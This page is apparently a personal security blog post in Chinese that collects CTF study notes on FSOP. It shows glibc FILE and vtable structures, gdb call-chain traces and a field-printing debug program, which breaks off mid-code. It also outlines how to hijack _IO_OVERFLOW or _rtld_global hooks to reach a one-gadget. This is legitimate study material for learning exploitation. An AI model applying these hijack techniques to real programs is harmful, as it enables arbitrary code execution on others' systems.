<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="分享一些bin学习日常的菜鸡">
<meta property="og:type" content="website">
<meta property="og:title" content="Coldshield&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Coldshield&#39;s blog">
<meta property="og:description" content="分享一些bin学习日常的菜鸡">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Coldshield">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false
  };
</script>

  <title>Coldshield's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Coldshield's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Mostly PWN & RE</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/25/FSOP-the-end/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/25/FSOP-the-end/" class="post-title-link" itemprop="url">FSOP&the_end</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-25 22:00:08" itemprop="dateCreated datePublished" datetime="2020-02-25T22:00:08+08:00">2020-02-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-04-08 20:08:01" itemprop="dateModified" datetime="2020-04-08T20:08:01+08:00">2020-04-08</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/25/FSOP-the-end/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/25/FSOP-the-end/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="FSOP学习"><a href="#FSOP学习" class="headerlink" title="FSOP学习"></a>FSOP学习</h1><p>由于刷how2heap时碰到了一题zerostorage，这个题在ubuntu14上由于存在一个<a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="noopener">offset2lib</a>的攻击，所以在泄露libc地址之后可以get到程序的地址，但是我复现这个题是在ubuntu16下面做的，所以这个攻击方法无效XD，得另寻他路，所以我找到了raycp师傅的<a href="https://www.anquanke.com/post/id/178418" target="_blank" rel="noopener">这篇文章</a>，上面提到了FSOP这个攻击姿势，理所当然我当然要啃一啃了，顺带借助了一下<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fsop-zh/" target="_blank" rel="noopener">CTFwiki</a>和师傅的另一篇<a href="https://ray-cp.github.io/archivers/HCTF-2018-PWN-writeup" target="_blank" rel="noopener">博客</a></p>
<h1 id="FILE"><a href="#FILE" class="headerlink" title="FILE *"></a>FILE *</h1><p>首先来看一下FILE这个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;<span class="comment">//fd</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="IO-FILE-plus-amp-IO-jump-t"><a href="#IO-FILE-plus-amp-IO-jump-t" class="headerlink" title="_IO_FILE_plus&amp;_IO_jump_t"></a>_IO_FILE_plus&amp;_IO_jump_t</h1><p>还有FILE结构体的封装和vtable，当然最最主要的就是这个指针和这个table了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h1><p>table中对应函数的调用姿势会尝试着慢慢更新的，现在菜鸡学到的有这几种：</p>
<ol>
<li><p>利用的是在程序调用 <code>exit</code> 后，会遍历 <code>_IO_list_all</code> ，调用 <code>_IO_2_1_stdout_</code> 下的 <code>vatable</code> 中 <code>_setbuf</code> 函数（wiki）</p>
</li>
<li><p>puts 在源码中实现的函数是<code>_IO_puts</code>，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的<code>_IO_sputn</code>，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。（wiki）</p>
</li>
<li><p>printf 调用栈（wiki）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure>

<p>自己试出来的几种，有些不同都是得自己去看源码啊（跪)，好像和上面比起来没有看到那个overflow：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">► f 0     7ffff7b042b0 write（没有setbuf，输出结尾有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 3     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 4     7ffff7a8647d _IO_file_xsputn+669</span><br><span class="line">  f 5     7ffff7a5a92d vfprintf+1981</span><br><span class="line">  f 6     7ffff7a62899 printf+153</span><br><span class="line">  f 7           40053e main+24</span><br><span class="line">  </span><br><span class="line">► f 0     7ffff7b042b0 write()（setbuf(stdout,0)，输出结尾有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 3     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 4     7ffff7a5cf94 buffered_vfprintf+308</span><br><span class="line">  f 5     7ffff7a5a32d vfprintf+445</span><br><span class="line">  f 6     7ffff7a62899 printf+153</span><br><span class="line">  f 7           4005e2 main+44</span><br><span class="line">  </span><br><span class="line">► f 0     7ffff7b042b0 write（没有setbuf，输出结尾没有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 3     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 4     7ffff7a89196 _IO_flush_all_lockp+374</span><br><span class="line">  f 5     7ffff7a8932a _IO_cleanup+26</span><br><span class="line">  f 6     7ffff7a46f9b __run_exit_handlers+139</span><br><span class="line">  f 7     7ffff7a47045</span><br><span class="line">  f 8     7ffff7a2d837 __libc_start_main+247</span><br><span class="line">  </span><br><span class="line">► f 0     7ffff7b042b0 write（setbuf(stdout,0)，输出结尾没有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 3     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 4     7ffff7a5cf94 buffered_vfprintf+308</span><br><span class="line">  f 5     7ffff7a5a32d vfprintf+445</span><br><span class="line">  f 6     7ffff7a62899 printf+153</span><br><span class="line">  f 7           4005e2 main+44</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp</code><br>控制<code>stdin</code>、<code>stdout</code>或者<code>stderr</code>中实现<code>fp-&gt;_mode &lt;= 0</code>以及<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>同时修改vtable里面的<code>_IO_OVERFLOW</code>为one gadget（来自raycp师傅的博客）</p>
</li>
<li><p>程序结束时在<code>_dl_fini_</code>中调用<code>_rtld_global</code>结构体的<code>__rtld_lock_lock_recursive</code>（来自raycp师傅的博客），准确来说这个不算FILE里面的，不过还是写一下记一下比较好</p>
</li>
</ol>
<h1 id="自己的调试代码"><a href="#自己的调试代码" class="headerlink" title="自己的调试代码"></a>自己的调试代码</h1><p>调试之前写了一个有0x40个a的test.txt（用python -c写进去的，因为无论用vim还是gedit好像都会在保存时自动加一个换行符，比较搞，用<code>cat test.txt|hd</code>就可以看到结尾是不是有换行符）</p>
<p>然后用下面的代码调试了一下…调试细节先放着，这个是帮我用来探索前面几个指针是怎么用的，还有很多细节其实都不太清楚，以后玩源码的时候再来看（结果写题的时候就发现直接用gdb p一下那个符号好像更明确….我佛了，不行就加上(_IO_FILE_plus *)转换一下地址的类型，这样看来代码写的好像多余了2333333）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printFILE</span><span class="params">(FILE * tmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_flags:%#x\n"</span>,*(<span class="keyword">int</span>*)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_flags)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_read_ptr:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_read_ptr)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_read_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_read_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_read_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_read_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_write_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_write_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_write_ptr:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_write_ptr)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_write_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_write_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_buf_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_buf_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_buf_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_buf_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_save_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_save_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_backup_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_backup_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_save_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_save_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_markers:%p\n"</span>,*(struct _IO_marker **)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_markers)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_chain:%p\n"</span>,*(struct _IO_FILE **)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_chain)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_fileno:%#x\n"</span>,*(<span class="keyword">int</span>*)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_fileno)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_flags2:%#x\n"</span>,*(<span class="keyword">int</span>*)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_flags2)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_old_offset:%#x\n"</span>,*(_IO_off_t *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_old_offset)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_cur_column:%#x\n"</span>,*(<span class="keyword">unsigned</span> short *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_cur_column)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_vtable_offset:%#x\n"</span>,*(<span class="keyword">signed</span> <span class="keyword">char</span> *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_vtable_offset)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_shortbuf:%#x\n"</span>,*(<span class="keyword">char</span> *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_shortbuf)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_lock:%#x\n\n"</span>,*(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(_IO_lock_t *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_lock)));</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"vatable*:%p\n\n"</span>,*(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+<span class="keyword">sizeof</span>(_IO_FILE)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 